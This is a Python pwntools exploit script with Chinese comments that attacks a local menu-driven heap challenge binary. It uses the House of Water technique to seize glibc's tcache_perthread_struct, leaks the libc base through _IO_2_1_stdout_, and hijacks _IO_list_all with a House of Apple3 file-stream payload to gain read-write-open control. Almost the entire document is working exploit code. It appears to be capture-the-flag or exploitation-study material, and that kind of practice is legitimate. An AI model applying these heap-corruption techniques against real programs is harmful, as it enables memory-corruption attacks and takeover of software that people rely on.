'''
    使用过House of Water的漏洞攻击stack的利用脚本
'''

from demo import *
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])
p = process("./demo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(index, size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('size:')
    p.sendline(str(size))
    pass

def show(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(index))
    pass

def edit(index, size, data, debug=False):
    if debug == False:
        p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.send(data)
    pass

def delete(index):
    p.recvuntil('>> ')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(index))
    pass

def setmem(addr, size, data):
    p.recvuntil('>> ')
    p.sendline('5')
    p.recvuntil('addr:')
    p.send(p64(addr))
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.send(data)
    pass

def exit():
    p.recvuntil('>> ')
    p.sendline('6')
    pass

def house_of_water2(libc, heap_base_mask = 0x0000, libc_base_mask = 0x0000, index_base = 0, heap_padding = 0):
    create(index_base + 0, 0x3d8)
    create(index_base + 1, 0x3e8)
    delete(index_base + 0)
    delete(index_base + 1)
    
    for i in range(index_base + 2, index_base + 9):
        create(i, 0x88)
    
    # 构建unsorted_start
    create(index_base + 9, 0x418)
    create(index_base + 10, 0x418)  # bk 0x30(unsorted_start-0x10)
    delete(index_base + 9)
    delete(index_base + 10)
    create(index_base + 9, 0x428)
    create(index_base + 11, 0x88)   # unsorted_start
    
    # 构建unsorted_end
    create(index_base + 12, 0x418)
    create(index_base + 13, 0x418)  # fd 0x20(unsorted_end-0x10)
    delete(index_base + 12)
    delete(index_base + 13)
    create(index_base + 12, 0x428)
    create(index_base + 14, 0x88)   # unsorted_end
    
    # padding
    create(index_base + 15, 0xe880 - heap_padding - 0x3d0 * 4)
    
    # 多添加一些chunk以备万一
    for i in range(index_base + 16, index_base + 20):
        create(i, 0x3c8)
    for i in range(index_base + 16, index_base + 20):
        delete(i)
    
    # 构建end_of_fake_chunk
    create(index_base + 16, 0x418)
    delete(index_base + 16)
    create(index_base + 17, 0x10)
    create(index_base + 18, 0x418)
    edit(index_base + 16, 0x20, b'\x00' * 0x10 + p64(0x10000) + p64(0x420))
    
    edit(index_base + 9, 0x428, b'\x00' * 0x418 + p64(0x31))    # unsorted_start
    edit(index_base + 12, 0x428, b'\x00' * 0x418 + p64(0x21))   # unsorted_end
    delete(index_base + 10) 
    delete(index_base + 13)
    
    edit(index_base + 10, 0x10, p64(0) + p64(0x91))       # unsorted_start
    edit(index_base + 13, 0x10, p64(0) + p64(0x91))       # unsorted_end
    
    # 填充tcache bin并将unsorted_end unsorted_start放入unsorted bin中
    for i in range(index_base + 2, index_base + 9):
        delete(i)
    delete(index_base + 14)         # unsorted_end
    delete(index_base + 11)         # unsorted_start
    create(index_base + 19, 0x500)  # 将其放入small bin中
    
    # 将 tcache_fake_chunk 添加进入small bin中
    edit(index_base + 11, 2, p16(heap_base_mask + 0x80))
    edit(index_base + 14, 10, p64(0) + p16(heap_base_mask + 0x80))
    
    # 利用unlink将其放入unsorted bin中并写入libc地址
    delete(index_base + 18)
    
    # 分配出tcache_perthread_struct(0x20, 0x30, 0x90, 0x3d0, 0x3e0, 0x3f0都可以被使用，其中0x3d0在前面故意留下的以写入更多的payload)
    create(index_base + 20, 0x218 + 0x20)
    
    # 利用_IO_2_1_stdout_泄露libc地址
    edit(index_base + 20, 0x8 + 2, p64(0) + p16((libc_base_mask + libc.sym['_IO_2_1_stdout_']) & 0xffff))
    create(index_base + 21, 0x28)
    edit(index_base + 21, 0x22, p64(0xfbad1800) + p64(0) * 3 + p16((libc_base_mask + 0x21b803 - 0x100) & 0xffff))# 0x21b803为修改前本身的值，也可以使用b'\x00' * 2，但是前者得到的libc地址更准确
    libc.address = u64(p.recv(timeout=2)[ -22 - 8: -22]) - 0x21aaa0 # 获取libc基地址
    
    # House of Apple3攻击
    payload_addr = libc.address + 0x21c000 - 0x600  # libc中的可以写的地址
    payload = HOA3underflow_orw(libc, payload_addr) # 这里使用House of Apple3进行orw攻击
    edit(index_base + 20, 0x8 * 60, p64(0) * 59 + p64(payload_addr), debug=True)
    create(index_base + 22, 0x3c8)
    edit(index_base + 22, len(payload), payload)
    
    # 修改_IO_list_all指向payload
    edit(index_base + 20, 0x8 * 60, p64(0) * 59 + p64(libc.sym['_IO_list_all']), debug=True)
    create(index_base + 23, 0x3c8)
    edit(index_base + 23, 8, p64(payload_addr))
    exit()

create(0, 0x18)
sleep(0.1)

house_of_water2(libc,
                heap_base_mask = p.heap_mapping().address & 0xffff,
                libc_base_mask = p.libc_mapping().address & 0xffff,
                heap_padding = 0x20)

# gdb.attach(p, '')
p.interactive()
